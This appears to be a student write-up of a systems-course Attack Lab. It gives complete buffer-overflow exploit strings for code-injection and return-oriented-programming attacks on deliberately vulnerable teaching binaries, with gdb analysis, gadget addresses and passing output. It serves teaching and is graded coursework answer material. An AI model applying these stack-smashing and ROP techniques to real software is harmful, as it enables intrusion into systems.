# Attack Lab

## Introduction
Students are given binaries called ctarget and rtarget that have a buffer overflow bug. 
We are going to alter the behavior of the given targets via five increasingly difficult
exploits. The three attacks on ctarget use code injection. The two attacks on rtarget use
return-oriented programming.
The `src` folder includes all the files required to accomplish our 5 attacks:
```
README.txt:  A file describing the contents of the directory
ctarget:     An executable program vulnerable to code-injection attacks
rtarget:     An executable program vulnerable to return-oriented-programming attacks
cookie.txt:  An 8-digit hex code that you will use as a unique identifier in your attacks.
farm.c:      The source code of your target gadget farm, which you will use in generating
             return-oriented programming attacks.
hex2raw:     A utility to generate attack strings
```

Both CTARGET and RTARGET read strings from standard input.
```C
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

## Code Injection Attacks
Function `getbuf()` is called within `ctarget` by a function test having the following C code:
```C
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```
When `getbuf` executes its return statement, the program ordinarily resumes execution
within function test. We want to change this behavior by injecting code as the input
to `ctarget`.

### Level 1
Within the file `ctarget`, there is code for a function touch1 having the following C
representation:
```C
void touch1()
{
    vlevel = 1;    /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```
Our mission is to using a string input that can overflow the stack from `getbuf()` and
to redirect the program to `touch1()` when `getbuf()` returns.
Now let's go to the `src/` folder and analyze the disassembled code:
```bash
  unix > cd src
  unix > objdump -d ctarget > ctarget.d
```
Once opening the `ctarget.d` with an editor, we can see the `<test>` function starts
at address `0x401968`, `<getbuf>` starts at address `0x4017a8` and `<touch1>` starts
at address `0x4017c0`. So our level 1 task is to let `<getbuf>` return to address
`0x4017c0` instead of its original `0x401976`. We can do the analysis with `gdb`

```bash
  src > gdb ctarget
  (gdb) b test
  Breakpoint 1 at 0x401968: file visible.c, line 90.
  (gdb) r -q
  Starting program: ${Your_Root_Path}/03-Attack-Lab/src/ctarget -q
  Cookie: 0x59b997fa
  
  Breakpoint 1, test () at visible.c:90
  90      visible.c: No such file or directory.
  (gdb) layout asm
  (gdb) layout regs
```
The `-q` parameter is used to skip network related operations in `ctarget`, and
you can run `ctarget -h` to view the concrete description of all valid parameters.
Then we use `si` to monitor the program by instruction. We can see that every time
a `callq` is executed, the address of the next instruction of `callq` will be pushed
to the stack. And once the stack popped up from the called function, the `retq` will
pop the stack and go to the address that previously stored.
Let's monitor the instruction when `<test>` calls `<getbuf>`:
```
  0x401971   callq 0x4017a8 <getbuf>
  0x401976   mov   %eax,%edx
  ...
```
When we use `si` to arrive at instruction `0x401971`, the current stack is `rsp=0x5561dca8`.
And we further type a `si` in `gdb` console, we can see that the stack is now
`rsp=0x5561dca0`, and the value of it:
```
  (gdb) x/8xb 0x5561dca0
  0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00  
```
Appearently, this is the original return address for `<getbuf>`. We are going to
use an input string to overwrite replace the stack frame at `0x5561dca0` by the address
of `<touch1>`. Next we will caluculate the size of bytes we need to inject in order
to reach `0x5561dca0`.
```
  <getbuf>
  0x4017a8:   sub    $0x28,%rsp
  0x4017ac:   mov    %rsp,%rdi
  0x4017af:   callq  401a40 <Gets>
  0x4017b4:   mov    $0x1,%eax
  0x4017b9:   add    $0x28,%rsp
  0x4017bd:   retq
```
According to the disassembled code, `<getbuf>` applies 40 bytes to stack, which means
that we need to first inject 40 bytes to occupy the stack of `<getbuf>` and then followed
by 8 bytes of address for `<touch1>` for the `retq` to redirect. One possible solution can
be
```
  00 00 00 00 00 00 00 00    /* stack space occupation */
  00 00 00 00 00 00 00 00    /* stack space occupation */
  00 00 00 00 00 00 00 00    /* stack space occupation */
  00 00 00 00 00 00 00 00    /* stack space occupation */
  00 00 00 00 00 00 00 00    /* stack space occupation */
  C0 17 40 00 00 00 00 00    /* the address of <touch1> */
```
Let's put the solution to file `ctarget.exploit.l1.txt`, and we can validate it by
executing from the following command `/src`
```
  03-Attack-Lab/src > cat ctarget.exploit.l1.txt | ./hex2raw | ./ctarget -q
    Cookie: 0x59b997fa
    Type string:Touch1!: You called touch1()
    Valid solution for level 1 with target ctarget
    PASS: ...
```

### Level 2
The task of level 2 is to redirect `<getbuf>` to `<touch2>`.
```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```
Moreover, we must make it appear to `<touch2>` as if our cookie `0x59b997fa` is passed to it.
Note that the first argument to a function is passed in register `%rdi`, we have to redirect
the `<getbuf>` to an address storing code of the following:
```
  mov $0x59b997fa,%rdi  # assign cookie value to register rdi
  retq                  # go to <touch2>
```
Let's put the assembly code to a file `ctarget.code.l2.s` and obtain its machine code
```
  03-Attack-Lab/src > gcc -c ctarget.code.l2.s
  03-Attack-Lab/src > objdump -d ctarget.code.l2.o > ctarget.code.l2.d
  03-Attack-Lab/src > cat ctarget.code.l2.d
    ctarget.code.l2.o:     file format elf64-x86-64
    Disassembly of section .text:
    0000000000000000 <.text>:
       0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
       7:   c3                      retq
```
Following the address redirection in the previous task, we will first redirect `<getbuf>` to
the stack address where we put the machine code above. Here, we put this machine code to the
stack bottom of `<getbuf>`, which is `0x5561dc78`. Second, we will further append the
address of `<touch2>`, which is `0x4017ec` to the stack address that `retq` in our injected
code will head to. In this case, our solution for level 2 will be:
```
  48 c7 c7 fa 97 b9 59 c3    /* injected code */
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  78 dc 61 55 00 00 00 00    /* the address of injected code */
  ec 17 40 00 00 00 00 00    /* the address of <touch2> */
```
Put the above exploit to file `ctarget.exploit.l2.txt` and execute it:
```
  03-Attack-Lab/src > cat ctarget.exploit.l2.txt | ./hex2raw | ./ctarget -q
    Cookie: 0x59b997fa
    Type string:Touch2!: You called touch2(0x59b997fa)
    Valid solution for level 2 with target ctarget
    PASS: ...
```

### Level 3
Level 3 also involves a code injection attack, but passing a string as argument.
Within the file `ctarget` there is code for functions `<hexmatch>` and `<touch3>`
having the following C representations:
```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```
We will redirect `<getbuf>` to `<touch3>`. This time, unlike passing the cookie
directly in Level 2, we will pass an address of string cookie `'59b997fa'`. Note
that `<touch3>` may occupy the stack space once used in `<getbuf>`, we are going
to put our string above the stack frame which used for `<touch3>` redirection.
According to the stack structure in Level 2, the address of this string is
`0x5561dcb0`. So our assembly code to inject is:
```asm
  mov $0x5561dcb0,%rdi    # set the address of cookie string to %rdi
  ret                     # go to <touch3>
```
Similar to Level 2, we use `gcc` and `objdump` to get the machine code
```bash
  03-Attack-Lab/src > gcc -c ctarget.code.l3.s
  03-Attack-Lab/src > objdump -d ctarget.code.l3.o > ctarget.code.l3.d
  03-Attack-Lab/src > cat ctarget.code.l3.d
    ctarget.code.l3.o:     file format elf64-x86-64
    Disassembly of section .text:
    0000000000000000 <.text>:
       0:   48 c7 c7 b0 dc 61 55    mov    $0x5561dcb0,%rdi
       7:   c3                      retq
```
Besides, we put the ascii encoded of cookie string `'59b997fa'` of 8 bytes to
the address `0x5561dcb0`, which is exactly the stack frame above the redirection
address to `<touch3>`. We arrive at our exploit for level 3:
```
  48 c7 c7 b0 dc 61 55 c3    /* injected code */
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  78 dc 61 55 00 00 00 00    /* the address of injected code */
  fa 18 40 00 00 00 00 00    /* the address of <touch3> */
  35 39 62 39 39 37 66 61    /* the cookie string in ascii */
  00 00 00 00 00 00 00 00
```
Put the above exploit to file `ctarget.exploit.l3.txt` and execute it:
```
  03-Attack-Lab/src > cat ctarget.exploit.l3.txt | ./hex2raw | ./ctarget -q
    Cookie: 0x59b997fa
    Type string:Touch3!: You called touch3("59b997fa")
    Valid solution for level 3 with target ctarget
    PASS: ...
```

## Return-Oriented Programming
Performing code-injection attacks on program `RTARGET` is much more difficult than it is for `CTARGET`,
because it uses two techniques to thwart such attacks:
+ It uses randomization so that the stack positions differ from one run to another. This makes it
  impossible to determine where the injected code will be located.
+ It marks the section of memory holding the stack as nonexecutable, so even if you could set the
  program counter to the start of the injected code, the program would fail with a segmentation fault.

To perform buffer attacks in this case, The most general form of this is referred to as *return-oriented
programming* (ROP). The strategy with ROP is to identify byte sequences within an existing program
that consist of one or more instructions followed by the instruction `ret`, whose machine code is
`0xc3`. Such a byte sequence is called a **gadget** in this context. From example, in the disassembled
code of `rtarget`, there is a part from function `<setval_210>`
```asm
  0000000000400f15 <setval_210>:
    400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
    400f1b: c3 retq
```
Luckily, we see that the byte sequence `48 89 c7` encodes the instruction `movq %rax, %rdi`. It means
that if we use previous buffer overflow technique to redirect next instruction to address `0x400f18`,
the program will perform the copy of 64-bit value from `%rax` to `%rdi`, and then return to another
address according to stack top frame.

## Level 2
In this task, we need to redirect the program to specific address, so that the instruction could
set value of `%rdi` by our cookie. The instructions we will execute can be:
```asm
  popq %rax          # 1st gadget, pop the stack value and store to register rax
  retq               # correctly set stack value heading to 2nd gadget
  movq %rax, %rdi    # 2nd gadget, copy value from register rax to rdi 
  retq               # correctly set stack value heading to <touch2>
```
Now we check the machine code of this part is:
```bash
  03-Attack-Lab/src > gcc -c rtarget.code.l2.s
  03-Attack-Lab/src > objdump -d rtarget.code.l2.o > rtarget.code.l2.d
  03-Attack-Lab/src > cat ctarget.code.l2.d
    rtarget.code.l2.o:     file format elf64-x86-64
    Disassembly of section .text:
    0000000000000000 <.text>:
       0:   58                      pop    %rax
       1:   c3                      retq
       2:   48 89 c7                mov    %rax,%rdi
       5:   c3                      retq
```
So the task becomes locating two gadgets ` 58 c3 ` and ` 48 89 c7 c3` in our gadget farm. Notice
that it is allowed any number of `90`, the machine code of `nop` instruction, before the `c3`.
Fortunately, we find the first gadget in `<getval_280>` with a sequence of `58 90 c3` and a second
gadget in `<addval_273>` with a sequence of `48 89 c7 c3`.
```asm
### first gadget ###
00000000004019ca <getval_280>:
  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:   c3                      retq

### second gadget ###
00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3
```
Hence, for the `ret` of `<getbuf>`, we first set the redirection address stack to be `0x4019cc`,
which is (`0x4019ca` + `0x2`) for the first gadget. As the first gadget will pop a stack value
to store in register `rax`, we also assure this value to be our cookie. Next, we set the return
address of first gadget to the second one, which is `0x4019a2`, then following the address of
`<touch2>`. Here is our solution for this task:
```
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  cc 19 40 00 00 00 00 00    /* the address of 1st gadget code */
  fa 97 b9 59 00 00 00 00    /* the value of cookie in hex */
  a2 19 40 00 00 00 00 00    /* the address of 2nd gadget code */
  ec 17 40 00 00 00 00 00    /* the address of <touch2> */
```
Putting it to `rtarget.exploit.l2.txt`, we can execute and pass the game:
```sh
  03-Attack-Lab/src > cat rtarget.exploit.l2.txt | ./hex2raw | ./rtarget -q
    Cookie: 0x59b997fa
    Type string:Touch2!: You called touch2(0x59b997fa)
    Valid solution for level 2 with target rtarget
    PASS: ...
```

## Level 3
This time, we are going to use return-oriented programming to head to `<touch3>`. Instead of
passing the direct long integer, we will pass a pointer to the ascii encoded string of our cookie.
Recall that in `ctarget`, we put the ascii string at the stack bottom, which is highest frame of
our overflowed buffer. So we will try to pass the correct stack address to `%rdi` before jumpping
`<touch3>`. By investigating the reference instruction table and the provided gadget farm, we 
find a way to read the value of `%rsp`, even it is a dynamic value from one run to anther. Moreover,
we will execute a summation of `add_xy(x=%rsp,y=constant)` to get the correct address of our ascii
string. The sequence of gadgets' assembly code along with its objective are shown in below:
```asm
  movq %rsp,%rax            ################################################
  ret                       # The first part consists of two gadgets
  movq %rax,%rdi            # which pass the stack top value to %rdi
  ret                       ################################################
  popq %rax                 #
  ret                       #
  movl %eax,%edx            # The second part pop a preset constant value
  ret                       # and pass from %eax to %esi
  movl %edx,%ecx            #
  ret                       #
  movl %ecx,%esi            #
  ret                       ################################################
  lea (%rdi,%rsi,1),%rax    # The third part sums up the stack value %rdi
  ret                       # and a constant %rsi, whose result should be
  movq %rax,%rdi            # the address of our cookie string in ascii.
  ret                       # Finally set the sum value to rdi and goto <touch3>
                            ################################################

```
By translating each gadget to the corresponding address, we arrive at our solution:
```
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  06 1a 40 00 00 00 00 00    /* the address of 1st gadget (movq %rsp,%rax 48 89 e0 c3 # from <addval_190>) */
  a2 19 40 00 00 00 00 00    /* the address of 2nd gadget (movq %rax,%rdi 48 89 c7 c3 # from <addval_273>) */
  cc 19 40 00 00 00 00 00    /* the address of 3rd gadget (popq %rax 58 90 c3 # from <getval_280>) */
  48 00 00 00 00 00 00 00    /* a constant 72 (0x48) for the exact cookie string address calculation */
  dd 19 40 00 00 00 00 00    /* the address of 4th gadget (movl %eax,%edx 89 c2 90 c3 # from <getval_481>) */
  34 1a 40 00 00 00 00 00    /* the address of 5th gadget (movl %edx,%ecx 89 d1 38 c9 c3 # from <getval_159>) */
  13 1a 40 00 00 00 00 00    /* the address of 6th gadget (movl %ecx,%esi 89 ce 90 90 c3 # from <addval_436>) */
  d6 19 40 00 00 00 00 00    /* the address of 7th gadget (lea (%rdi,%rsi,1),%rax 48 8d 04 3d c3 # from <add_xy>) */
  a2 19 40 00 00 00 00 00    /* the address of 8th gadget (movq %rax,%rdi 48 89 c7 90 c3 # from <setval_426>) */
  fa 18 40 00 00 00 00 00    /* the address of <touch3> */
  35 39 62 39 39 37 66 61    /* the cookie string in ascii */
  00 00 00 00 00 00 00 00    /* put '\0' to end of c string */
```
Put the exploit to `rtarget.exploit.l3.txt`, we can pass `<touch3>`:
```sh
  03-Attack-Lab/src > cat rtarget.exploit.l3.txt | ./hex2raw | ./rtarget -q
    Cookie: 0x59b997fa
    Type string:Touch3!: You called touch3("59b997fa")
    Valid solution for level 3 with target rtarget
    PASS: ...
```

